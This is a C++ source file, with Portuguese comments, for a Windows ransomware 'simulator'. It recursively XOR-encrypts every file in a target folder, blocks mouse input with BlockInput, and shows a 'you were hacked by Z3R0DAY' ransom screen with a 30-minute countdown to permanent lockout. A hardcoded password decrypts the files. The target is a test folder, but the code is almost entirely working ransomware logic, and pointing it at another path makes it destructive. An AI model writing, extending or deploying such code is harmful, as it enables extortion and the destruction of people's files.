#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <vector>
#include <chrono>
#include <thread>
#include <atomic>
#include <windows.h> // Essencial para cores e bloqueio

namespace fs = std::filesystem;

// --- MÓDULO 1: ESTADOS DO SISTEMA ---
enum class AppState {
    WAITING_FOR_PASSWORD,
    DECRYPTING,
    LOCKED_PERMANENTLY,
    SUCCESS
};

// --- MÓDULO 2: MOTOR DE CRIPTOGRAFIA ---
class CryptoEngine {
private:
    char key; 

public:
    CryptoEngine(std::string password) {
        key = password.empty() ? 'a' : password[0];
    }

    void processFile(const fs::path& filePath, bool encrypt) {
        std::ifstream inFile(filePath, std::ios::binary);
        if (!inFile) return;

        std::vector<char> buffer((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
        inFile.close();

        for (size_t i = 0; i < buffer.size(); i++) {
            buffer[i] ^= key; 
        }

        std::ofstream outFile(filePath, std::ios::binary);
        if (!outFile) return;
        outFile.write(buffer.data(), buffer.size());
        outFile.close();
    }
};

// --- MÓDULO 3: SCANNER DE ARQUIVOS ---
class FileScanner {
private:
    CryptoEngine& engine;

public:
    FileScanner(CryptoEngine& ce) : engine(ce) {}

    void scanAndProcess(const std::string& targetDir, bool encrypt) {
        if (!fs::exists(targetDir)) return;

        for (const auto& entry : fs::recursive_directory_iterator(targetDir)) {
            try {
                if (entry.is_regular_file()) {
                    std::string pathStr = entry.path().string();
                    if (pathStr.find("Windows") != std::string::npos || 
                        pathStr.find("simulador.exe") != std::string::npos) continue;

                    engine.processFile(entry.path(), encrypt);
                }
            } catch (...) { continue; }
        }
    }
};

// --- MÓDULO 4: CORE (TIMER E CONTROLE) ---
class RansomwareCore {
private:
    std::atomic<int> timeLeft; 
    std::atomic<AppState> currentState;
    const int INITIAL_TIME = 30 * 60; 

public:
    RansomwareCore() : timeLeft(INITIAL_TIME), currentState(AppState::WAITING_FOR_PASSWORD) {}

    void startTimer() {
        while (timeLeft > 0 && currentState == AppState::WAITING_FOR_PASSWORD) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
            timeLeft--;
            if (timeLeft <= 0) currentState = AppState::LOCKED_PERMANENTLY;
        }
    }

    void checkPassword(std::string input) {
        if (currentState == AppState::LOCKED_PERMANENTLY) return;
        if (input == "batata") currentState = AppState::DECRYPTING;
        else std::cout << "\n[!] SENHA INCORRETA!\n";
    }

    AppState getState() const { return currentState.load(); }
    int getTime() const { return timeLeft.load(); }
};

// --- MÓDULO 5: INTERFACE (CORES E VISUAL) ---
class Renderer {
private:
    void setTextColor(int color) {
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
    }

public:
    void renderUI(const RansomwareCore& core) {
        // Limpa a tela para simular o preenchimento total
        system("cls"); 

        // Fundo Preto (Simulado)
        setTextColor(7); // Branco

        std::cout << "\n\n\n";
        std::cout << "====================================================\n";
        std::cout << "        SISTEMA TOTALMENTE BLOQUEADO                \n";
        std::cout << "====================================================\n";
        
        // Mensagem de Alerta em Vermelho Brilhante
        setTextColor(12); // Vermelho Brilhante
        std::cout << "\n\n    [AVISO: VOCE FOI HACKEADO POR Z3R0DAY]\n";
        
        setTextColor(7); // Volta para Branco
        std::cout << "\n----------------------------------------------------\n";
        std::cout << "  TODOS OS SEUS ARQUIVOS FORAM CRIPTOGRAFADOS.       \n";
        std::cout << "  O TEMPO ESTA CORRENDO. NÃO TENTE FECHAR O SISTEMA. \n";
        std::cout << "----------------------------------------------------\n";

        if (core.getState() == AppState::LOCKED_PERMANENTLY) {
            setTextColor(4); // Vermelho Escuro
            std::cout << "\n    [!!!] TEMPO ESGOTADO! ACESSO PERMANENTE NEGADO [!!!]\n";
        } else {
            int mins = core.getTime() / 60;
            int secs = core.getTime() % 60;
            std::cout << "\n    TEMPO PARA RECUPERACAO: " << mins << ":" << (secs < 10 ? "0" : "") << "\n";
            std::cout << "\n    DIGITE A SENHA: ";
        }
        
        setTextColor(7); 
    }
};

// --- MÓDULO 6: MAIN (O ORQUESTRADOR FINAL) ---
int main() {
    // CONFIGURAÇÃO DO ALVO
    std::string pastaAlvo = "./test_folder"; 
    std::string senhaCorreta = "batata";
    
    RansomwareCore core;
    CryptoEngine engine(senhaCorreta);
    FileScanner scanner(engine);
    Renderer renderer;

    // 1. Inicia a Criptografia Imediata
    std::cout << "[!] Preparando sistema de ataque...\n";
    scanner.scanAndProcess(pastaAlvo, true); 
    std::cout << "[!] Arquivos criptografados com sucesso.\n";

    // 2. Bloqueio do Mouse (para não clicar em nada)
    // Nota: O teclado fica livre para o input da senha
    BlockInput(TRUE); 

    // 3. Inicia o Timer em background
    std::thread timerThread(&RansomwareCore::startTimer, &core);

    // 4. Loop de Interface
    while (core.getState() != AppState::SUCCESS && core.getState() != AppState::LOCKED_PERMANENTLY) {
        renderer.renderUI(core);

        std::string input;
        std::cin >> input; // Usuário digita a senha

        if (core.getState() == AppState::WAITING_FOR_PASSWORD) {
            core.checkPassword(input);
            
            if (core.getState() == AppState::DECRYPTING) {
                std::cout << "\n[!] Senha aceita. Iniciando DESCRIPTOGRAFIA...\n";
                scanner.scanAndProcess(pastaAlvo, false); 
                std::cout << "[!] SUCESSO! Arquivos recuperados.\n";
                break; 
            }
        }

        if (core.getTime() < 1) break; 
    }

    // 5. Liberação do Hardware
    BlockInput(FALSE); 

    if (core.getState() == AppState::LOCKED_PERMANENTLY) {
        std::cout << "\n[!] SISTEMA TRAVADO. O TEMPO ACABOU.\n";
    }

    timerThread.join();
    return 0;
}
